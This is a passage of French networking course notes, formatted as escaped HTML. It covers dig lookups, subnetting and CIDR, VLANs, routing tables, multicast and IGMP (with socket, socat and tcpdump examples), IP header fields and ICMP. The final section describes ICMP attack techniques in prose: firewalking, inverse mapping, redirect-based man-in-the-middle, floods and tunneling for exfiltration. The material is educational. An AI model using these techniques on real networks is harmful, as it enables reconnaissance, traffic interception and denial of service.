&lt;span class=&quot;c&quot;&gt;# SOA request&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig soa unilim.fr

&lt;span class=&quot;c&quot;&gt;# TTL decrease&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig +noall +answer gmail.com
gmail.com.		299	IN	A	216.58.213.165
...
...
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig +noall +answer gmail.com
gmail.com.		274	IN	A	216.58.213.165

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig +short mx unilim.fr
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig +short mx google.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;L’ordre des réponses varie afin de ne pas surcharger un serveur, pour cela, on utilise des algorithmes de &lt;code class=&quot;highlighter-rouge&quot;&gt;Round-Robin&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Obtenir des infos sur une IP avec DNS (remplace la commande &lt;code class=&quot;highlighter-rouge&quot;&gt;host&lt;/code&gt;).&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig 4.1.81.164.origin.asn.cymru.com TXT +short &lt;span class=&quot;c&quot;&gt;# give IP&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;1935 | 164.81.0.0/16 | FR | ripencc | 1993-01-04&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# AS numero, addr block, country, ...&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig AS1935.asn.cymru.com TXT +short &lt;span class=&quot;c&quot;&gt;# give AS&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;1935 | EU | ripencc | 1993-09-01 | FR-RENATER-LIMOUSIN Reseau Regional Limousin, FR&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;conception-de-réseaux--la-segmentation&quot;&gt;Conception de réseaux : la segmentation&lt;/h1&gt;

&lt;h3 id=&quot;subnetting&quot;&gt;Subnetting&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;passer d’un réseau en &lt;code class=&quot;highlighter-rouge&quot;&gt;/24&lt;/code&gt; à 2 réseaux en &lt;code class=&quot;highlighter-rouge&quot;&gt;/25&lt;/code&gt; ou en 4 réseaux &lt;code class=&quot;highlighter-rouge&quot;&gt;/26&lt;/code&gt;,…&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;supernetting&quot;&gt;Supernetting&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;passer de 2 réseaux en &lt;code class=&quot;highlighter-rouge&quot;&gt;/25&lt;/code&gt; en un réseau &lt;code class=&quot;highlighter-rouge&quot;&gt;/24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;vlsm&quot;&gt;VLSM&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Variable Length Subnet Masks&lt;/li&gt;
  &lt;li&gt;plusieurs masques de sous-réseaux compatibles hiérarchiquement&lt;/li&gt;
  &lt;li&gt;passer d’un réseau &lt;code class=&quot;highlighter-rouge&quot;&gt;/24&lt;/code&gt; en 1 réseaux &lt;code class=&quot;highlighter-rouge&quot;&gt;/25&lt;/code&gt; et 2 réseaux &lt;code class=&quot;highlighter-rouge&quot;&gt;/26&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;le but est de se rapprocher le plus possible des besoins en @ IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;cidr&quot;&gt;CIDR&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Classless InterDomain Routing&lt;/li&gt;
  &lt;li&gt;utiliser la notation &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.0.0/16&lt;/code&gt; au lieu de &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.0.0&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;255.255.0.0&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;on ne parle plus de notion de classe&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;simplification-du-routage&quot;&gt;Simplification du routage&lt;/h3&gt;

&lt;p&gt;Certains blocs sont associés à des régions du monde. Par exemple, quant un routeur hors d’Europe reçoit une paquet à destination de &lt;code class=&quot;highlighter-rouge&quot;&gt;194.x.y.z&lt;/code&gt; ou &lt;code class=&quot;highlighter-rouge&quot;&gt;195.x.y.z&lt;/code&gt;, il doit l’expédier vers un routeur européen.&lt;/p&gt;

&lt;p&gt;CIDR de &lt;code class=&quot;highlighter-rouge&quot;&gt;/1&lt;/code&gt; à &lt;code class=&quot;highlighter-rouge&quot;&gt;/32&lt;/code&gt;, les &lt;code class=&quot;highlighter-rouge&quot;&gt;/31&lt;/code&gt; sont réservés pour connexion &lt;strong&gt;point à point&lt;/strong&gt; entre routeurs. On parle de réseaux d’interconnexion: réseaux uniquement composés de routeurs.&lt;/p&gt;

&lt;p&gt;Le CIDR est similaire au VLSM:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;le VLSM est réalisé à l’intérieur du réseau de l’organisation et il est caché de l’extérieur&lt;/li&gt;
  &lt;li&gt;le CIDR est réalisé par les différents organismes, FAI, et il est visible de l’extérieur&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;domaine-de-diffusion-et-de-collision&quot;&gt;Domaine de diffusion et de collision&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Domaine de diffusion&lt;/strong&gt;: zone de taille maximale où il est possible de recevoir un message envoyé dans une zone, limite de transmission d’une trame.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Domaine de collision&lt;/strong&gt;: zone du réseau où il existe une compétition pour l’accès à cette zone, les collisions peuvent provoquer une baisse de débit par rapport à la capacité du réseau.&lt;/p&gt;

&lt;h3 id=&quot;commutation&quot;&gt;Commutation&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;couche 3: routeur, , il retransmet, “forward” les datagrammes, il réalise du routage&lt;/li&gt;
  &lt;li&gt;couche 2: pont, il retransmet, “forward” des trames, réalise de la commutation&lt;/li&gt;
  &lt;li&gt;couche 1: répéteur, ne commute pas, mais allonge les distances, il retransmet les bits&lt;/li&gt;
  &lt;li&gt;modes de commutation:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cut-through switching&lt;/code&gt;: commutation le plus rapidement possible.&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;store-and-forward&quot;&lt;/code&gt;: commutation après réception totale&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;switch-vlans&quot;&gt;Switch VLANs&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;créer plusieurs domaines de diffusion segmentés
    &lt;ul&gt;
      &lt;li&gt;plusieurs ports à un domaine de diffusion&lt;/li&gt;
      &lt;li&gt;réaliser travail de pont entre ces différents ports&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;le switch crée des LANs virtuels, appelés VLANs&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;VLANs :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;on a plusieurs domaines de diffusion, broadcast domaines avec un seul matériel&lt;/li&gt;
  &lt;li&gt;associer un port à un VLAN&lt;/li&gt;
  &lt;li&gt;personne peut rester dans un bureau tout en migrant dans un VLAN différent&lt;/li&gt;
  &lt;li&gt;permet de faire de la segmentation&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;table-de-routage&quot;&gt;Table de routage&lt;/h3&gt;

&lt;p&gt;Chaque entrée contient :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;le réseau de destination&lt;/li&gt;
  &lt;li&gt;l’adresse du prochain saut
    &lt;ul&gt;
      &lt;li&gt;routage directe : interface du routeur s’il est connecté au réseau de desti.&lt;/li&gt;
      &lt;li&gt;routage indirecte : @ du prochain saut pour atteindre desti.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;la table contient aussi une route par défaut, pour les desti. inconnues&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;desti.&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;next hop&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.0.0/16&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.20.0.0/16&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.0.1&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.0.1&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.20.0.1&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;default&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.0.1&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# suivre routage avec traceroute de scapy&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; sn,unans &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; traceroute&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'www.unilim.fr'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;maxttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;diffusion-dans-un-réseau&quot;&gt;Diffusion dans un réseau&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Unicast : pour un seul desti.&lt;/li&gt;
  &lt;li&gt;Broadcast : pour tout le monde&lt;/li&gt;
  &lt;li&gt;Multicast : pour un groupe&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Le multicast dans IPv4 est limité au réseau local, mais peut être retransmis par un routeur s’il est configuré pour le faire.&lt;/p&gt;

&lt;p&gt;La classe D est réservée pour le multicast: &lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.0.0/4&lt;/code&gt; de &lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.0.0&lt;/code&gt; à &lt;code class=&quot;highlighter-rouge&quot;&gt;239.255.255.255&lt;/code&gt;. Aussi, il existe des groupes prédéfinies:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Address&lt;/th&gt;
      &lt;th&gt;Destination&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.0.1&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;All hosts on a subnet&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.0.2&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;All routers on a subnet&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.0.5&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;All OSPF routers&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.0.9&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;All RIPv2 routers&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.0.12&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;DHCP server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.1.1&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;NTP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.0.251&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Multicast DNS&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;On associe à ces adresses une @MAC particulière:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;commence par &lt;code class=&quot;highlighter-rouge&quot;&gt;01:00:5e&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;se termine par les 23 derniers bits de l’IP du groupe&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# join multicast group
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gestion_mcast&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;4sl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inet_aton&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;224.0.0.127&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ma_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IPPROTO_IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_ADD_MEMBERSHIP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gestion_mcast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ma_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IPPROTO_IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_MULTICAST_LOOP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# IP_MULTICAST_LOOP : choose if emeter will receive its own paquets
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;multicast-et-routeurs&quot;&gt;Multicast et routeurs&lt;/h3&gt;

&lt;p&gt;Lorsqu’une machine rejoint un groupe multicast, elle diffuse un message au format IGMP, Internet Group Management Protocol. Cela permet de prévenir les routeurs présents dans le réseau, même chose lorsqu’elle quitte le groupe. Les routeurs devront donc relayer vers cette machine les paquets du groupe multicast.&lt;/p&gt;

&lt;h3 id=&quot;igmp--internet-group-management-protocol&quot;&gt;IGMP : Internet Group Management Protocol&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# create a group&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;socat stdio udp-recvfrom:7182,ip-add-membership&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;224.0.0.127:eth0,fork

&lt;span class=&quot;c&quot;&gt;# listen IGMP paquets&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-nvveX&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 igmp
&lt;span class=&quot;c&quot;&gt;# to_ex {} : quitte l'execlusion donc rejoindre&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# to_in {} : terminaison du groupe&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Les switchs écoutent les ports qui diffusent des messages IGMP pour limiter le multicast des paquets, il réalise de l’IGMP snooping, IGMP : vers &lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.0.22&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ex: diffusion d’un flux RTP, Real Time Protocol, pour la diffusion d’un flux vidéo au travers d’un routeur, protocole fourre-tout pour différents types de flux, basé UDP, ports 6970 à 6999.&lt;/p&gt;

&lt;h3 id=&quot;mdns-localisation-de-services-dans-un-réseau-privé&quot;&gt;mDNS: localisation de services dans un réseau privé&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;basé sur des paquets DNS traditionnels&lt;/li&gt;
  &lt;li&gt;chaque hôte possède sa propre liste d’enregistrements (A, MX, SRV,…)&lt;/li&gt;
  &lt;li&gt;chaque hôte diffuse liste des services qu’il offre grâce au champ SRV&lt;/li&gt;
  &lt;li&gt;en &lt;code class=&quot;highlighter-rouge&quot;&gt;.local&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;en multicast &lt;code class=&quot;highlighter-rouge&quot;&gt;224.0.0.251&lt;/code&gt;, port 5353 en UDP, @MAC = &lt;code class=&quot;highlighter-rouge&quot;&gt;01:00:5e:00:00:fb&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;datagramme-ip&quot;&gt;Datagramme IP&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Version&lt;/code&gt;: 4 bits, 4 (pour IPv4) ou 6 (pour IPv6)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Header Length&lt;/code&gt;: 4 bits, longueur en nombre de mots 4 octets, souvent à &lt;code class=&quot;highlighter-rouge&quot;&gt;5&lt;/code&gt;, c’est à dire 20 octets car 4*5=20 (en-tête de mini 20 octets (sans option))&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Type of Service&lt;/code&gt;: 8 bits, indique la manière dont doit être géré le datagramme par le routeur
    &lt;ul&gt;
      &lt;li&gt;priorité (4 premiers bits) de 0 à 7 (même administration)&lt;/li&gt;
      &lt;li&gt;les 4 bits: D, T, R et C spécifient ce que l’on veut privilégier, D : minimiser délai, T : maximiser débit, R : fiabilité, C : coût de transmission, DTRC tout à 1 pour la sécurité, on recycle les bits 6 et 7 pour l’ECN, Explicit Congestion Notification, permet de détecter l’entrée en congestion du réseau, c’est à dire qu’il va bientôt saturer&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Total Packet Length&lt;/code&gt; : 16 bits, taille en octets du datagramme (en-tête + data)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Identification&lt;/code&gt; : 16 bits, pour regrouper après fragmentation&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Flags&lt;/code&gt;: 4 bits, pour fragmentation&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Fragment Offset&lt;/code&gt; : 12 bits, pour fragmentation&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;TTL&lt;/code&gt;: Time To Live, nombre de routeurs que peut traverser le datagramme avant d’être détruit (val défaut: 128), quand routeur détruit paquet avec TTL = 0, envoie ICMP, permet de ne pas avoir de paquets indéfiniment dans un réseau&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Protocol&lt;/code&gt;: 8 bits, indique protocole de couche supérieur, 1 : ICMP, 6 : TCP, 2 : IGMP, 17 : UDP&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Header Checksum&lt;/code&gt; : 16 bits, assure intégrité de l’en-tête, complément à 1 de la somme des valeurs de l’en-tête, pour détection d’erreur&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Src. Address&lt;/code&gt; : 32 bits&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Dest. Address&lt;/code&gt; : 32 bits&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Options&lt;/code&gt; : liste de longueur variable, mais toujours complétée par bits de bourrage, pour avoir mutliple de 4 octets, très peu utilisées, si Header Length &amp;gt; 20, alors on a des options.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;icmp&quot;&gt;ICMP&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Internet Control Message Protocol&lt;/li&gt;
  &lt;li&gt;effectue contrôle des échanges&lt;/li&gt;
  &lt;li&gt;permet de debugger un réseau&lt;/li&gt;
  &lt;li&gt;différents messages avec signification
    &lt;ul&gt;
      &lt;li&gt;messages d’erreurs&lt;/li&gt;
      &lt;li&gt;messages de requêtes&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Type&lt;/code&gt; : 8 bits&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Code&lt;/code&gt; : 8 bits&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Checksum&lt;/code&gt; : 16 bits&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Data&lt;/code&gt; : 32 bits&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;attaques-utilisant-icmp&quot;&gt;Attaques utilisant ICMP&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;reconnaissance d’un réseau&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ICMP Sweep, balayer plage d’adresses d’un réseau (ex: nmap)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Traceroute : envoi successif de datagramme avec valeur TTL incrémenté de 1
    &lt;ul&gt;
      &lt;li&gt;lorsque routeur forward datagramme, il décrémente le TTL&lt;/li&gt;
      &lt;li&gt;si TTL = 0, routeur répond un ICMP Time Exceed, @src = @routeur&lt;/li&gt;
      &lt;li&gt;on a info sur chemin et topologie du réseau traversé&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Firewalking : amélioration d’un traceroute classique
    &lt;ul&gt;
      &lt;li&gt;traceroute classique pour déterminer le nombre n de sauts, hops jusqu’au firewall&lt;/li&gt;
      &lt;li&gt;envoyer datagramme avec TTL de n+1 et associé à un protocole choisi:
        &lt;ul&gt;
          &lt;li&gt;si ICMP Time Excedeed est reçu, alors le datagramme a réussi à traverser le firewall&lt;/li&gt;
          &lt;li&gt;sinon, une règle de firewall a filtré le datagramme&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Inverse Mapping : mapper réseau interne protégé par un firewall
    &lt;ul&gt;
      &lt;li&gt;attaquant envoi paquets ICMP Echo Reply vers plage d’adresses présumées derrière le firewall&lt;/li&gt;
      &lt;li&gt;le firewall autorise à passer car il ne maintient pas de liste des requêtes ICMP (sauf bon firewall ou bonne conf.)&lt;/li&gt;
      &lt;li&gt;s’il existe un routeur interne, ce dernier retourne ICMP Host Unreachabble pour chaque hôte indisponible du réseau, ce qui informe par déduction, l’attaquant sur les machines présentes dans le réseau&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;L’OS Fingerprinting : reconnaitre OS d’une machine
    &lt;ul&gt;
      &lt;li&gt;envoi datagramme UDP avec DF à 1 vers cible avec num de port fermé&lt;/li&gt;
      &lt;li&gt;cible retourne ICMP Destination Port Unreachable&lt;/li&gt;
      &lt;li&gt;en analysant le format du paquet ICMP réponse, on peut avoir des info sur la cible (un Linux ? un mac ? un PC ?)&lt;/li&gt;
      &lt;li&gt;autres façon : comparer paquets ping envoyé par un mac et un pc&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ICMP Route Redirect : paquet envoyé par un routeur lorsqu’il:
    &lt;ul&gt;
      &lt;li&gt;reçoit du trafic d’un hôte et que le prochain saut de ce trafique (en regardant sa table de routage) est dans le même réseau que celui de l’hôte&lt;/li&gt;
      &lt;li&gt;possible de faire du Man-In-The-Middle
        &lt;ul&gt;
          &lt;li&gt;attaquant prend le contrôle du routeur R1&lt;/li&gt;
          &lt;li&gt;attaquant envoi ICMP Redirection vers le victime en prenant la place du routeur R2, utilisé par la victime&lt;/li&gt;
          &lt;li&gt;cette redirection demande à la victime de modifier sa table de routage pour passer par R1 au lieu de R2&lt;/li&gt;
          &lt;li&gt;l’attaquant intercepte le trafic sur R1&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;paquets ICMP Oversized : paquet ICMP de taille maximale envoyé vers la victime fait planter sa pile TCP/IP&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ICMP Router Discovery : paquets transmis dans le réseau pour permettre à un hôte de découvrir les routeurs présents : router solicitation&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;attaquant peut répondre par un “Router Advertisement” et prendre la place du routeur par défaut pour la victime&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ICMP Floods: inonder victimes de messages ICMP, pour ralentir et peut-être l’empêcher de communiquer&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Smurt Attack: envoi de paquets ICMP Echo Request en diffusion sur le réseau, avec adresse de la victime en adresse source&lt;/li&gt;
      &lt;li&gt;ne fonctionne plus&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Le Tunneling: encapsuler des données dans paquets ICMP (exfiltration), difficile à découvrir, et peut-être chiffré&lt;/li&gt;
